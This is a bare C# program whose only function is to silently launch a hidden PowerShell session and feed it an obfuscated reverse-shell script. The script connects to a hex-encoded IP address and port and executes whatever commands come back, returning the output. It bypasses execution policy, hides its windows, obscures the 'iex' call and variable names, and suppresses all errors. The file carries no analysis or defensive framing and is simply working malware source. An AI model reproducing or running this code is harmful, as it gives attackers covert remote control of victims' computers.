using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        try
        {
            string command = "Start-Process $PSHOME\\powershell.exe -ArgumentList {-ep bypass -nop $UmrP9UYgeT = New-Object System.Net.Sockets.TCPClient('0xc0a800f6',0x2329);$UAALwnu8VT = $UmrP9UYgeT.GetStream();[byte[]]$toqTNpCrP0 = 0..65535|%{0};while(($tKedJUcPcx = $UAALwnu8VT.Read($toqTNpCrP0, 0, $toqTNpCrP0.Length)) -ne 0){;$bxrcMtOWsX = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($toqTNpCrP0,0, $tKedJUcPcx);$4bSKrEoJ9S = (i''e`x $bxrcMtOWsX 2>&1 | Out-String );$OX78HxWskW = $4bSKrEoJ9S + '<:---SHELL---:> ' + (pwd).Path + ' ~# ';$l4ibfYUPlo = ([text.encoding]::ASCII).GetBytes($OX78HxWskW);$UAALwnu8VT.Write($l4ibfYUPlo,0,$l4ibfYUPlo.Length);$UAALwnu8VT.Flush()};$UmrP9UYgeT.Close()} -WindowStyle Hidden";
            ProcessStartInfo psi = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                RedirectStandardInput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
             };

            Process process = new Process
            {
                StartInfo = psi,
                EnableRaisingEvents = true
            };

           process.Start();

            process.StandardInput.WriteLine(command);
            process.StandardInput.WriteLine("exit"); // End the PowerShell session

            process.WaitForExit();
            process.Close();
        }
        catch (Exception)
        {
        }
    }
}
